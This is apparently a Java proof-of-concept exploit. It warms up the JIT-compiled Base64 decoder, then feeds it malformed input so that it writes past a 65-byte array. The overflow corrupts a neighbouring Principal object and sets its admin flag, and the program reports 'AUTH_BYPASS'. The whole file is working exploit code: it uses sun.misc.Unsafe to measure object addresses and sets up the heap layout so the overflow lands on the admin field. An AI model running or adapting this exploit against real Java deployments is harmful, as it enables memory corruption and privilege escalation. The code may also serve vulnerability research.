import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

/**
 * Order matters: allocate creds AND the authority object first, decode second.
 *
 * With the decode after both allocations the authority object sits at
 * creds+88, inside the 62-byte spill (creds+88 .. creds+127), so its mark,
 * klass and first fields are overwritten.
 *
 * `admin` is the first instance field: object offset 12. The spill writes
 * 0x9a at that position, which is a non-zero byte, so the gate reads true.
 * Reading an instance field does not dereference the klass pointer, so the
 * damaged class pointer does not prevent the check.
 */
public final class RemoteChain2 {
    private static volatile int sink;
    private static sun.misc.Unsafe u;
    private static final Object[] BOX = new Object[1];
    private static long boxBase;

    static final class Principal {
        volatile boolean admin;
        String user = "anonymous";
    }

    static long addr(Object o) {
        BOX[0] = o;
        return u.getLong(BOX, boxBase);
    }

    public static void main(String[] a) throws Exception {
        Field uf = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
        uf.setAccessible(true);
        u = (sun.misc.Unsafe) uf.get(null);
        boxBase = u.arrayBaseOffset(Object[].class);

        Base64.Decoder d = Base64.getDecoder();
        byte[] valid = "A".repeat(64).getBytes(StandardCharsets.US_ASCII);
        byte[] bad = ("A".repeat(64) + "=").getBytes(StandardCharsets.US_ASCII);
        byte[] warm = new byte[4096];
        for (int i = 0; i < 200_000; i++) sink += d.decode(valid, warm);

        System.out.println("=== allocation order: creds, principal, then decode ===");
        for (int attempt = 0; attempt < 5; attempt++) {
            for (int i = 0; i < 50_000; i++) sink += d.decode(valid, warm);

            byte[] creds = new byte[65];
            Principal p = new Principal();
            long gap = addr(p) - addr(creds);
            boolean before = p.admin;

            try { d.decode(bad, creds); } catch (IllegalArgumentException e) { }

            boolean after;
            String err = "";
            try { after = p.admin; } catch (Throwable t) { after = false; err = t.toString(); }

            System.out.printf("  #%d gap=%d admin: %b -> %b %s%n", attempt, gap, before, after, err);
            if (after) {
                System.out.println("[gate] admin authority granted by the overflow");
                System.out.println("RESULT=AUTH_BYPASS");
                return;
            }
        }
        System.out.println("RESULT=NO_BYPASS");
    }
}
